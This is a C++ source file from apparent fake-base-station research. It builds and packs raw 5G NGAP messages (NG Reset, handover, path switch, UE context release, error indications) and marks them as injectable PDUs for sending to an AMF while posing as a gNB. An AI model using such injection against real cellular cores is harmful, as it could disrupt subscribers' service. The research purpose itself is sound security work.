// UHM WINGS Fake Base Station Research

#include "CLI/CLI11.hpp"
#include "lib/gateways/sctp_network_gateway_common_impl.h"
#include "lib/ngap/ngap_asn1_converters.h"
#include "lib/ngap/ngap_asn1_helpers.h"
#include "ocudu/asn1/asn1_utils.h"
#include "ocudu/asn1/ngap/common.h"
#include "ocudu/asn1/rrc_nr/rrc_nr.h"
#include "ocudu/cu_cp/cu_cp_types.h"
#include "ocudu/gateways/sctp_network_gateway.h"
#include "ocudu/gateways/sctp_socket.h"
#include "ocudu/ngap/ngap_context.h"
#include "ocudu/ngap/ngap_message.h"
#include "ocudu/ocudulog/ocudulog.h"
#include "ocudu/ran/cause/ngap_cause.h"
#include "ocudu/ran/plmn_identity.h"
#include "ocudu/support/io/sockets.h"
#include <algorithm>
#include <arpa/inet.h>
#include <array>
#include <cerrno>
#include <chrono>
#include <cctype>
#include <cstdio>
#include <cstdlib>
#include <cstdint>
#include <cstring>
#include <iostream>
#include <netdb.h>
#include <net/ethernet.h>
#include <netpacket/packet.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <nlohmann/json.hpp>
#include <poll.h>
#include <netinet/ip.h>
#include <atomic>
#include <fcntl.h>
#include <netinet/sctp.h>
#include <optional>
#include <regex>
#include <iomanip>
#include <sstream>
#include <stdexcept>
#include <string>
#include <sys/socket.h>
#include <sys/select.h>
#include <thread>
#include <unordered_map>
#include <vector>

using namespace ocudu;
using namespace ocudu::ocucp;
using namespace asn1::ngap;

namespace {

static constexpr unsigned stream_no                 = 0;
static constexpr size_t   network_gateway_sctp_mtu = 9100;
static constexpr uint64_t  max_amf_ue_ngap_id       = 1099511627775ULL;
static constexpr uint64_t  max_ran_ue_ngap_id       = 4294967295ULL;
static constexpr uint64_t  max_pdu_session_id       = pdu_session_id_to_uint(pdu_session_id_t::max);
static constexpr uint32_t  default_gnb_id           = 411;
static constexpr uint8_t   default_gnb_id_bit_len   = 22;
static constexpr uint16_t  default_sector_id        = 0;
static constexpr uint64_t  max_default_gnb_id       = (1ULL << default_gnb_id_bit_len) - 1;
static constexpr const char* default_ran_node_name   = "cu_cp_01";

static uint32_t    current_gnb_id = default_gnb_id;
static std::string current_ran_node_name{default_ran_node_name};

struct probe_config {
  std::vector<std::string> amf_addresses;
  int                      amf_port              = NGAP_PORT;
  std::vector<std::string> bind_addresses;
  int                      bind_port             = 0;
  std::string              bind_interface        = "auto";
  int                      init_max_attempts     = 2;
  int                      max_init_timeo_ms     = 1000;
  bool                     dump_pdu_hex          = true;
  bool                     inspect_ngap          = false;
  bool                     dump_capture_hex      = false;
  std::string              capture_interface;

};

struct ue_ngap_ids {
  uint64_t amf_ue_ngap_id;
  uint64_t ran_ue_ngap_id;
};

enum class ue_message_type {
  ng_setup_request,
  ng_reset,
  ng_reset_acknowledge,
  ran_configuration_update,
  amf_configuration_update_acknowledge,
  amf_configuration_update_failure,
  non_ue_error_indication,
  ue_context_release_request,
  uplink_nas_transport,
  pdu_session_resource_release_response,
  nas_non_delivery_indication,
  pdu_session_resource_notify,
  handover_required,
  handover_request_acknowledge,
  handover_failure,
  handover_cancel,
  path_switch_request,
  initial_ue_message,
  initial_context_setup_response,
  initial_context_setup_failure,
  ue_context_release_complete,
  ue_context_modification_response,
  ue_context_modification_failure,
  rrc_inactive_transition_report,
  ue_context_suspend_request,
  ue_context_resume_request,
  ran_cp_relocation_indication,
  ue_error_indication,
  ue_radio_capability_info_indication,
  duplicate_registration_replay_flow,
  pdu_session_resource_setup_response,
  pdu_session_resource_modify_response,
  pdu_session_resource_modify_indication,
  ue_radio_capability_check_response,
  location_report,
  location_reporting_failure_indication,
  handover_notify,
  uplink_ran_status_transfer,
  uplink_ran_early_status_transfer,
  ue_radio_capability_id_mapping_response,
  trace_failure_indication,
  cell_traffic_trace,
  secondary_rat_data_usage_report,
  connection_establishment_indication, ue_context_suspend_response, ue_context_resume_response, reroute_nas_request, ue_information_transfer,
  broadcast_session_modification_response, broadcast_session_release_response, broadcast_session_setup_response, broadcast_session_transport_response,
  distribution_setup_response, distribution_release_response, multicast_session_activation_response, multicast_session_deactivation_response,
  multicast_session_update_response, timing_synchronisation_status_response, handover_success, uplink_ran_configuration_transfer,
  uplink_rim_information_transfer, uplink_non_ue_associated_nrppa_transport, uplink_ue_associated_nrppa_transport,
  ue_tnla_binding_release_request, ran_paging_request, timing_synchronisation_status_report, write_replace_warning_response,
  pws_failure_indication, pws_restart_indication
};

struct injectable_ngap_pdu {
  byte_buffer pdu;
  const char* name;
  int         wait_before_send_ms = 0;
  std::string wait_for_amf_before_send;
  int         amf_wait_timeout_ms = 10000;
};

static byte_buffer pack_ngap_message(ngap_message& ngap_msg, const char* message_name)
{
  byte_buffer   packed_pdu{byte_buffer::fallback_allocation_tag{}};
  asn1::bit_ref bref(packed_pdu);
  if (ngap_msg.pdu.pack(bref) != asn1::OCUDUASN_SUCCESS) {
    throw std::runtime_error(std::string("Failed to pack ") + message_name);
  }

  return packed_pdu;
}

static cu_cp_user_location_info_nr default_user_location_info()
{
  cu_cp_user_location_info_nr user_location_info = {};
  user_location_info.nr_cgi.plmn_id             = plmn_identity::test_value();
  user_location_info.nr_cgi.nci                 = nr_cell_identity::create(gnb_id_t{current_gnb_id, default_gnb_id_bit_len}, default_sector_id).value();
  user_location_info.tai.plmn_id                = plmn_identity::test_value();
  user_location_info.tai.tac                    = 7;
  return user_location_info;
}

static byte_buffer make_hex_byte_buffer_or_throw(const std::string& hex);
static cause_c build_radio_network_cause(const std::string& cause_name);
static asn1::ngap::global_gnb_id_s build_global_gnb_id(const std::string& plmn, uint32_t gnb_id);
static user_location_info_c build_user_location_info(const std::string& plmn, const std::string& tac);
static up_transport_layer_info_c build_gtp_tunnel(const std::string& address, uint32_t teid);
static std::string describe_ngap_pdu(const byte_buffer& pdu);
static std::string ipv4_to_bit_string(const std::string& address);

static constexpr const char* default_ho_prep_rrc_container_hex =
    "0021930680ce811d1968097e340e1480005824c5c00060fc2c00637fe002e00131401a0000000880058d006007a071e"
    "439f0000240400e03"
    "00000000100186c0000700809df0000000000000103a0002000012cb2800281c50f0007000f00000004008010240a0";

static constexpr const char* default_rrc_handover_command_container_hex =
    "081a115568220201204550001e1004bcc012121600020509a0000193f7c7000000243434840be2e0260030258380f80408d078100009"
    "39dc601349798002692f120200046402051320c6b6c6bb003704020000080800041a235246c013497890000023271adb19127c058332"
    "55ff8092748837146e30dc71b9637dfab6387580221603400c162300e0102908024985950001ff000000000306e10840003c02ca0041"
    "8000001034c080a28500071c48000133557c841c001040c2050c1c9c48a163068e1e408800004280004005a8000864428000c645a800"
    "10024280014025a8001862428001c625a800200842800240c8200a0320902c0c8280c0320b0340c8300e0320d03c0c83810162080440"
    "e829024b92a4a1814388e8acf1379340e9041e2efc0c10e0000001c7feb311aa6ab940b000010cbb00000000000000000008422b5514"
    "011c00401020800388402710038082042000710804e10070204104000e21009c200e0608108001c420138601c10104100038840270c0"
    "020000002086020406080706800071c40000002004000806000809002200a60000231002271c00600040";

static bool decode_ue_capability_rat_container_list(const byte_buffer& input,
                                                    asn1::rrc_nr::ue_cap_rat_container_list_l& capability_list)
{
  asn1::cbit_ref bref({input.begin(), input.end()});
  asn1::rrc_nr::ue_cap_rat_container_list_l decoded;
  if (asn1::unpack_dyn_seq_of(decoded, bref, 0, 8) == asn1::OCUDUASN_SUCCESS) {
    capability_list = std::move(decoded);
    return true;
  }
  return false;
}

static bool decode_ue_radio_access_capability_info(const byte_buffer& input,
                                                   asn1::rrc_nr::ue_cap_rat_container_list_l& capability_list)
{
  asn1::rrc_nr::ue_radio_access_cap_info_s cap_info = {};
  asn1::cbit_ref                           bref({input.begin(), input.end()});
  if (cap_info.unpack(bref) != asn1::OCUDUASN_SUCCESS ||
      cap_info.crit_exts.type() != asn1::rrc_nr::ue_radio_access_cap_info_s::crit_exts_c_::types_opts::c1 ||
      cap_info.crit_exts.c1().type() !=
          asn1::rrc_nr::ue_radio_access_cap_info_s::crit_exts_c_::c1_c_::types_opts::ue_radio_access_cap_info) {
    return false;
  }

  const auto& wrapped_capability = cap_info.crit_exts.c1().ue_radio_access_cap_info().ue_radio_access_cap_info;
  byte_buffer capability_pdu{byte_buffer::fallback_allocation_tag{}};
  if (!capability_pdu.append(wrapped_capability.begin(), wrapped_capability.end())) {
    return false;
  }
  return decode_ue_capability_rat_container_list(capability_pdu, capability_list);
}

static byte_buffer build_handover_preparation_rrc_container_from_capability(const byte_buffer& capability_input)
{
  asn1::rrc_nr::ue_cap_rat_container_list_l capability_list;
  if (!decode_ue_capability_rat_container_list(capability_input, capability_list) &&
      !decode_ue_radio_access_capability_info(capability_input, capability_list)) {
    throw std::runtime_error("Failed to decode UE capability hex as UE-CapabilityRAT-ContainerList or "
                             "UERadioAccessCapabilityInformation");
  }

  asn1::rrc_nr::ho_prep_info_s      ho_prep = {};
  asn1::rrc_nr::ho_prep_info_ies_s& ies     = ho_prep.crit_exts.set_c1().set_ho_prep_info();
  ies.ue_cap_rat_list                       = std::move(capability_list);

  byte_buffer   packed{byte_buffer::fallback_allocation_tag{}};
  asn1::bit_ref bref{packed};
  if (ho_prep.pack(bref) != asn1::OCUDUASN_SUCCESS) {
    throw std::runtime_error("Failed to pack RRC HandoverPreparationInformation");
  }
  return packed;
}

static byte_buffer build_ng_setup_request()
{
  ngap_context_t ngap_ctxt = {{current_gnb_id, default_gnb_id_bit_len},
                              current_ran_node_name,
                              "AMF",
                              amf_index_t::min,
                              {{7, {{plmn_identity::test_value(), {{slice_service_type{1}}}}}}},
                              {},
                              256};

  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg();
  ngap_msg.pdu.init_msg().load_info_obj(ASN1_NGAP_ID_NG_SETUP);
  fill_asn1_ng_setup_request(ngap_msg.pdu.init_msg().value.ng_setup_request(), ngap_ctxt);

  return pack_ngap_message(ngap_msg, "NGSetupRequest");
}

static byte_buffer build_ue_context_release_request(uint64_t                  amf_ue_ngap_id,
                                                    uint64_t                  ran_ue_ngap_id,
                                                    ngap_cause_radio_network_t cause)
{
  cu_cp_ue_context_release_request release_request = {};
  release_request.cause = cause;

  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg();
  ngap_msg.pdu.init_msg().load_info_obj(ASN1_NGAP_ID_UE_CONTEXT_RELEASE_REQUEST);

  auto& asn1_request            = ngap_msg.pdu.init_msg().value.ue_context_release_request();
  asn1_request->amf_ue_ngap_id = amf_ue_ngap_id;
  asn1_request->ran_ue_ngap_id = ran_ue_ngap_id;
  fill_asn1_ue_context_release_request(asn1_request, release_request);

  return pack_ngap_message(ngap_msg, "UEContextReleaseRequest");
}

static byte_buffer build_uplink_nas_transport(uint64_t amf_ue_ngap_id, uint64_t ran_ue_ngap_id, byte_buffer nas_pdu)
{
  cu_cp_ul_nas_transport ul_nas_transport = {};
  ul_nas_transport.nas_pdu                = std::move(nas_pdu);
  ul_nas_transport.user_location_info     = default_user_location_info();

  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg();
  ngap_msg.pdu.init_msg().load_info_obj(ASN1_NGAP_ID_UL_NAS_TRANSPORT);

  auto& asn1_msg            = ngap_msg.pdu.init_msg().value.ul_nas_transport();
  asn1_msg->amf_ue_ngap_id = amf_ue_ngap_id;
  asn1_msg->ran_ue_ngap_id = ran_ue_ngap_id;
  fill_asn1_ul_nas_transport(asn1_msg, ul_nas_transport);

  return pack_ngap_message(ngap_msg, "UplinkNASTransport");
}

static byte_buffer
build_pdu_session_resource_release_response(uint64_t amf_ue_ngap_id, uint64_t ran_ue_ngap_id, uint16_t pdu_session_id)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_successful_outcome().load_info_obj(ASN1_NGAP_ID_PDU_SESSION_RES_RELEASE);

  auto& asn1_resp            = ngap_msg.pdu.successful_outcome().value.pdu_session_res_release_resp();
  asn1_resp->amf_ue_ngap_id = amf_ue_ngap_id;
  asn1_resp->ran_ue_ngap_id = ran_ue_ngap_id;

  asn1::ngap::pdu_session_res_release_resp_transfer_s transfer = {};
  transfer.ext                                                = false;
  byte_buffer transfer_pdu = pack_into_pdu(transfer, "PDUSessionResourceReleaseResponseTransfer");
  if (transfer_pdu.empty()) {
    throw std::runtime_error("Failed to pack PDUSessionResourceReleaseResponseTransfer");
  }

  asn1::ngap::pdu_session_res_released_item_rel_res_s released_item = {};
  released_item.pdu_session_id                                     = pdu_session_id;
  released_item.pdu_session_res_release_resp_transfer              = std::move(transfer_pdu);
  asn1_resp->pdu_session_res_released_list_rel_res.push_back(std::move(released_item));

  return pack_ngap_message(ngap_msg, "PDUSessionResourceReleaseResponse");
}

static byte_buffer build_pdu_session_resource_setup_response(uint64_t    amf_ue_ngap_id,
                                                            uint64_t    ran_ue_ngap_id,
                                                            uint16_t    pdu_session_id,
                                                            uint32_t    teid,
                                                            std::string transport_layer_address,
                                                            uint8_t     qfi)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_successful_outcome().load_info_obj(ASN1_NGAP_ID_PDU_SESSION_RES_SETUP);

  auto& msg            = ngap_msg.pdu.successful_outcome().value.pdu_session_res_setup_resp();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;
  msg->pdu_session_res_setup_list_su_res_present = true;

  pdu_session_res_setup_resp_transfer_s transfer = {};
  transfer.dl_qos_flow_per_tnl_info.up_transport_layer_info = build_gtp_tunnel(transport_layer_address, teid);
  associated_qos_flow_item_s qos = {};
  qos.qos_flow_id = qfi;
  transfer.dl_qos_flow_per_tnl_info.associated_qos_flow_list.push_back(qos);

  pdu_session_res_setup_item_su_res_s item = {};
  item.pdu_session_id = pdu_session_id;
  item.pdu_session_res_setup_resp_transfer = pack_into_pdu(transfer, "PDUSessionResourceSetupResponseTransfer");
  if (item.pdu_session_res_setup_resp_transfer.empty()) {
    throw std::runtime_error("Failed to pack PDUSessionResourceSetupResponseTransfer");
  }
  msg->pdu_session_res_setup_list_su_res.push_back(std::move(item));

  return pack_ngap_message(ngap_msg, "PDUSessionResourceSetupResponse");
}

static ue_associated_lc_ng_conn_item_s build_ue_associated_lc_ng_conn_item(const ue_ngap_ids& ids)
{
  ue_associated_lc_ng_conn_item_s item = {};
  item.amf_ue_ngap_id_present         = true;
  item.ran_ue_ngap_id_present         = true;
  item.amf_ue_ngap_id                 = ids.amf_ue_ngap_id;
  item.ran_ue_ngap_id                 = ids.ran_ue_ngap_id;
  return item;
}

static byte_buffer build_ng_reset(bool reset_ng_interface, const std::vector<ue_ngap_ids>& ue_ids)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_NG_RESET);

  auto& msg = ngap_msg.pdu.init_msg().value.ng_reset();
  msg->cause = build_radio_network_cause("radio-connection-with-ue-lost");
  if (reset_ng_interface) {
    msg->reset_type.set_ng_interface() = reset_all_opts::reset_all;
  } else {
    auto& list = msg->reset_type.set_part_of_ng_interface();
    for (const auto& ids : ue_ids) {
      list.push_back(build_ue_associated_lc_ng_conn_item(ids));
    }
  }

  return pack_ngap_message(ngap_msg, "NGReset");
}

static byte_buffer build_ng_reset_acknowledge(const std::vector<ue_ngap_ids>& ue_ids)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_successful_outcome().load_info_obj(ASN1_NGAP_ID_NG_RESET);

  auto& msg = ngap_msg.pdu.successful_outcome().value.ng_reset_ack();
  if (!ue_ids.empty()) {
    msg->ue_associated_lc_ng_conn_list_present = true;
    for (const auto& ids : ue_ids) {
      msg->ue_associated_lc_ng_conn_list.push_back(build_ue_associated_lc_ng_conn_item(ids));
    }
  }

  return pack_ngap_message(ngap_msg, "NGResetAcknowledge");
}

static byte_buffer build_ran_configuration_update(uint32_t    gnb_id,
                                                  std::string plmn,
                                                  std::string tac,
                                                  uint8_t     sst,
                                                  std::string sd,
                                                  bool        include_tnl_removal,
                                                  std::string ngran_tnl_address,
                                                  bool        include_amf_tnl_address,
                                                  std::string amf_tnl_address)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_RAN_CFG_UPD);

  auto& msg = ngap_msg.pdu.init_msg().value.ran_cfg_upd();
  msg->global_ran_node_id_present = true;
  msg->global_ran_node_id.set_global_gnb_id() = build_global_gnb_id(plmn, gnb_id);

  msg->supported_ta_list_present = true;
  supported_ta_item_s ta_item    = {};
  ta_item.tac.from_string(tac);
  broadcast_plmn_item_s plmn_item = {};
  plmn_item.plmn_id.from_string(plmn);
  slice_support_item_s slice = {};
  slice.s_nssai.sst.from_number(sst);
  if (!sd.empty() && sd != "none") {
    slice.s_nssai.sd_present = true;
    slice.s_nssai.sd.from_string(sd);
  }
  plmn_item.tai_slice_support_list.push_back(slice);
  ta_item.broadcast_plmn_list.push_back(plmn_item);
  msg->supported_ta_list.push_back(ta_item);

  if (include_tnl_removal) {
    msg->ngran_tnl_assoc_to_rem_list_present = true;

    ngran_tnl_assoc_to_rem_item_s tnl_item = {};
    tnl_item.tnl_assoc_transport_layer_address.set_endpoint_ip_address().from_string(
        ipv4_to_bit_string(ngran_tnl_address));

    if (include_amf_tnl_address) {
      tnl_item.tnl_assoc_transport_layer_address_amf_present = true;
      tnl_item.tnl_assoc_transport_layer_address_amf.set_endpoint_ip_address().from_string(
          ipv4_to_bit_string(amf_tnl_address));
    }

    msg->ngran_tnl_assoc_to_rem_list.push_back(std::move(tnl_item));
  }

  return pack_ngap_message(ngap_msg, "RANConfigurationUpdate");
}


static byte_buffer build_amf_configuration_update_acknowledge()
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_successful_outcome().load_info_obj(ASN1_NGAP_ID_AMF_CFG_UPD);
  (void)ngap_msg.pdu.successful_outcome().value.amf_cfg_upd_ack();
  return pack_ngap_message(ngap_msg, "AMFConfigurationUpdateAcknowledge");
}

static byte_buffer build_amf_configuration_update_failure(const std::string& cause_name)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_unsuccessful_outcome().load_info_obj(ASN1_NGAP_ID_AMF_CFG_UPD);

  auto& msg = ngap_msg.pdu.unsuccessful_outcome().value.amf_cfg_upd_fail();
  msg->cause = build_radio_network_cause(cause_name);

  return pack_ngap_message(ngap_msg, "AMFConfigurationUpdateFailure");
}

static byte_buffer build_error_indication(bool        include_amf_ue_ngap_id,
                                          uint64_t    amf_ue_ngap_id,
                                          bool        include_ran_ue_ngap_id,
                                          uint64_t    ran_ue_ngap_id,
                                          bool        include_cause,
                                          std::string cause_name,
                                          bool        criticality_diagnostics_present)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_ERROR_IND);

  auto& msg = ngap_msg.pdu.init_msg().value.error_ind();
  msg->amf_ue_ngap_id_present = include_amf_ue_ngap_id;
  msg->ran_ue_ngap_id_present = include_ran_ue_ngap_id;
  msg->cause_present          = include_cause;
  if (include_amf_ue_ngap_id) {
    msg->amf_ue_ngap_id = amf_ue_ngap_id;
  }
  if (include_ran_ue_ngap_id) {
    msg->ran_ue_ngap_id = ran_ue_ngap_id;
  }
  if (include_cause) {
    msg->cause = build_radio_network_cause(cause_name);
  }
  msg->crit_diagnostics_present = criticality_diagnostics_present;

  return pack_ngap_message(ngap_msg, "ErrorIndication");
}

static byte_buffer build_nas_non_delivery_indication(uint64_t    amf_ue_ngap_id,
                                                     uint64_t    ran_ue_ngap_id,
                                                     std::string cause_name,
                                                     byte_buffer nas_pdu)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_NAS_NON_DELIVERY_IND);

  auto& msg            = ngap_msg.pdu.init_msg().value.nas_non_delivery_ind();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;
  msg->nas_pdu        = std::move(nas_pdu);
  msg->cause          = build_radio_network_cause(cause_name);

  return pack_ngap_message(ngap_msg, "NASNonDeliveryIndication");
}

static byte_buffer build_pdu_session_resource_notify(uint64_t amf_ue_ngap_id,
                                                     uint64_t ran_ue_ngap_id,
                                                     uint16_t pdu_session_id,
                                                     uint8_t  qfi,
                                                     std::string cause_name)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_PDU_SESSION_RES_NOTIFY);

  auto& msg                         = ngap_msg.pdu.init_msg().value.pdu_session_res_notify();
  msg->amf_ue_ngap_id              = amf_ue_ngap_id;
  msg->ran_ue_ngap_id              = ran_ue_ngap_id;
  msg->pdu_session_res_notify_list_present = true;

  pdu_session_res_notify_item_s item = {};
  item.pdu_session_id = pdu_session_id;
  pdu_session_res_notify_transfer_s transfer = {};
  qos_flow_notify_item_s qos = {};
  qos.qos_flow_id    = qfi;
  qos.notif_cause    = notif_cause_opts::not_fulfilled;
  transfer.qos_flow_notify_list.push_back(qos);
  qos_flow_with_cause_item_s released_qos = {};
  released_qos.qos_flow_id = qfi;
  released_qos.cause       = build_radio_network_cause(cause_name);
  transfer.qos_flow_released_list.push_back(released_qos);
  item.pdu_session_res_notify_transfer = pack_into_pdu(transfer, "PDUSessionResourceNotifyTransfer");
  if (item.pdu_session_res_notify_transfer.empty()) {
    throw std::runtime_error("Failed to pack PDUSessionResourceNotifyTransfer");
  }
  msg->pdu_session_res_notify_list.push_back(std::move(item));

  return pack_ngap_message(ngap_msg, "PDUSessionResourceNotify");
}

static target_id_c build_target_id(uint32_t target_gnb_id, const std::string& plmn, const std::string& tac)
{
  target_id_c target;
  auto&       ran_node = target.set_target_ran_node_id();
  ran_node.global_ran_node_id.set_global_gnb_id() = build_global_gnb_id(plmn, target_gnb_id);
  ran_node.sel_tai.plmn_id.from_string(plmn);
  ran_node.sel_tai.tac.from_string(tac);
  return target;
}

static handov_type_e parse_handover_type(const std::string& value)
{
  if (value == "5gs-to-eps") {
    return handov_type_opts::fivegs_to_eps;
  }
  if (value == "eps-to-5gs") {
    return handov_type_opts::eps_to_5gs;
  }
  return handov_type_opts::intra5gs;
}

static byte_buffer build_source_to_target_transparent_container(uint32_t           target_gnb_id,
                                                                const std::string& plmn,
                                                                uint16_t           pdu_session_id,
                                                                uint8_t            qfi,
                                                                byte_buffer        rrc_container)
{
  source_ngran_node_to_target_ngran_node_transparent_container_s container = {};
  container.rrc_container                                                 = std::move(rrc_container);

  pdu_session_res_info_item_s pdu_info = {};
  pdu_info.pdu_session_id              = pdu_session_id;
  qos_flow_info_item_s qos_info        = {};
  qos_info.qos_flow_id                 = qfi;
  pdu_info.qos_flow_info_list.push_back(qos_info);
  container.pdu_session_res_info_list.push_back(pdu_info);

  auto& target_nr_cgi = container.target_cell_id.set_nr_cgi();
  target_nr_cgi.plmn_id.from_string(plmn);
  target_nr_cgi.nr_cell_id.from_number(
      nr_cell_identity::create(gnb_id_t{target_gnb_id, default_gnb_id_bit_len}, default_sector_id).value().value());

  last_visited_cell_item_s        last_visited_cell = {};
  last_visited_ngran_cell_info_s& ngran_cell        = last_visited_cell.last_visited_cell_info.set_ngran_cell();
  auto&                           source_nr_cgi     = ngran_cell.global_cell_id.set_nr_cgi();
  source_nr_cgi.plmn_id.from_string(plmn);
  source_nr_cgi.nr_cell_id.from_number(
      nr_cell_identity::create(gnb_id_t{current_gnb_id, default_gnb_id_bit_len}, default_sector_id).value().value());
  ngran_cell.cell_type.cell_size = cell_size_opts::small;
  container.ue_history_info.push_back(last_visited_cell);

  byte_buffer   packed{byte_buffer::fallback_allocation_tag{}};
  asn1::bit_ref bref{packed};
  if (container.pack(bref) != asn1::OCUDUASN_SUCCESS) {
    throw std::runtime_error("Failed to pack SourceToTarget-TransparentContainer");
  }
  return packed;
}

static byte_buffer build_handover_required(uint64_t    amf_ue_ngap_id,
                                           uint64_t    ran_ue_ngap_id,
                                           std::string cause_name,
                                           uint32_t    target_gnb_id,
                                           std::string handover_type,
                                           std::string plmn,
                                           std::string tac,
                                           uint16_t    pdu_session_id,
                                           uint8_t     qfi,
                                           byte_buffer rrc_container)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_HO_PREP);

  auto& msg            = ngap_msg.pdu.init_msg().value.ho_required();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;
  msg->cause          = build_radio_network_cause(cause_name);
  msg->handov_type    = parse_handover_type(handover_type);
  msg->target_id      = build_target_id(target_gnb_id, plmn, tac);
  msg->source_to_target_transparent_container =
      build_source_to_target_transparent_container(target_gnb_id, plmn, pdu_session_id, qfi, std::move(rrc_container));

  pdu_session_res_item_ho_rqd_s item = {};
  item.pdu_session_id = pdu_session_id;
  ho_required_transfer_s transfer = {};
  item.ho_required_transfer       = pack_into_pdu(transfer, "HandoverRequiredTransfer");
  if (item.ho_required_transfer.empty()) {
    throw std::runtime_error("Failed to pack HandoverRequiredTransfer");
  }
  msg->pdu_session_res_list_ho_rqd.push_back(item);

  return pack_ngap_message(ngap_msg, "HandoverRequired");
}

static byte_buffer build_target_to_source_transparent_container(const std::string& rrc_container_hex)
{
  target_ngran_node_to_source_ngran_node_transparent_container_s container = {};
  container.rrc_container = make_hex_byte_buffer_or_throw(rrc_container_hex);

  byte_buffer   packed{byte_buffer::fallback_allocation_tag{}};
  asn1::bit_ref bref{packed};
  if (container.pack(bref) != asn1::OCUDUASN_SUCCESS) {
    throw std::runtime_error("Failed to pack TargetToSource-TransparentContainer");
  }
  return packed;
}

static byte_buffer build_handover_request_acknowledge(uint64_t    amf_ue_ngap_id,
                                                      uint64_t    ran_ue_ngap_id,
                                                      uint16_t    pdu_session_id,
                                                      uint32_t    teid,
                                                      std::string transport_layer_address,
                                                      uint8_t     qfi,
                                                      byte_buffer target_to_source_container)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_successful_outcome().load_info_obj(ASN1_NGAP_ID_HO_RES_ALLOC);

  auto& msg            = ngap_msg.pdu.successful_outcome().value.ho_request_ack();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;
  msg->target_to_source_transparent_container = std::move(target_to_source_container);

  ho_request_ack_transfer_s transfer = {};
  transfer.dl_ngu_up_tnl_info = build_gtp_tunnel(transport_layer_address, teid);
  qos_flow_item_with_data_forwarding_s qos = {};
  qos.qos_flow_id = qfi;
  transfer.qos_flow_setup_resp_list.push_back(qos);

  pdu_session_res_admitted_item_s item = {};
  item.pdu_session_id = pdu_session_id;
  item.ho_request_ack_transfer = pack_into_pdu(transfer, "HandoverRequestAcknowledgeTransfer");
  if (item.ho_request_ack_transfer.empty()) {
    throw std::runtime_error("Failed to pack HandoverRequestAcknowledgeTransfer");
  }
  msg->pdu_session_res_admitted_list.push_back(std::move(item));

  return pack_ngap_message(ngap_msg, "HandoverRequestAcknowledge");
}

static byte_buffer build_handover_failure(uint64_t amf_ue_ngap_id, const std::string& cause_name, byte_buffer fail_container)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_unsuccessful_outcome().load_info_obj(ASN1_NGAP_ID_HO_RES_ALLOC);

  auto& msg            = ngap_msg.pdu.unsuccessful_outcome().value.ho_fail();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->cause          = build_radio_network_cause(cause_name);
  if (!fail_container.empty()) {
    msg->targetto_source_fail_transparent_container_present = true;
    msg->targetto_source_fail_transparent_container = std::move(fail_container);
  }

  return pack_ngap_message(ngap_msg, "HandoverFailure");
}

static byte_buffer build_handover_cancel(uint64_t amf_ue_ngap_id, uint64_t ran_ue_ngap_id, std::string cause_name)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_HO_CANCEL);

  auto& msg            = ngap_msg.pdu.init_msg().value.ho_cancel();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;
  msg->cause          = build_radio_network_cause(cause_name);

  return pack_ngap_message(ngap_msg, "HandoverCancel");
}

static byte_buffer build_path_switch_request(uint64_t    amf_ue_ngap_id,
                                             uint64_t    ran_ue_ngap_id,
                                             uint16_t    pdu_session_id,
                                             uint32_t    teid,
                                             std::string transport_layer_address,
                                             uint8_t     qfi,
                                             std::string plmn,
                                             std::string tac)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_PATH_SWITCH_REQUEST);

  auto& msg                   = ngap_msg.pdu.init_msg().value.path_switch_request();
  msg->source_amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id        = ran_ue_ngap_id;
  msg->user_location_info    = build_user_location_info(plmn, tac);
  msg->ue_security_cap.nr_encryption_algorithms.from_number(49152);
  msg->ue_security_cap.nr_integrity_protection_algorithms.from_number(49152);
  msg->ue_security_cap.eutr_aencryption_algorithms.from_number(0);
  msg->ue_security_cap.eutr_aintegrity_protection_algorithms.from_number(0);

  path_switch_request_transfer_s transfer = {};
  transfer.dl_ngu_up_tnl_info = build_gtp_tunnel(transport_layer_address, teid);
  qos_flow_accepted_item_s qos = {};
  qos.qos_flow_id = qfi;
  transfer.qos_flow_accepted_list.push_back(qos);

  pdu_session_res_to_be_switched_dl_item_s item = {};
  item.pdu_session_id = pdu_session_id;
  item.path_switch_request_transfer = pack_into_pdu(transfer, "PathSwitchRequestTransfer");
  if (item.path_switch_request_transfer.empty()) {
    throw std::runtime_error("Failed to pack PathSwitchRequestTransfer");
  }
  msg->pdu_session_res_to_be_switched_dl_list.push_back(std::move(item));

  return pack_ngap_message(ngap_msg, "PathSwitchRequest");
}

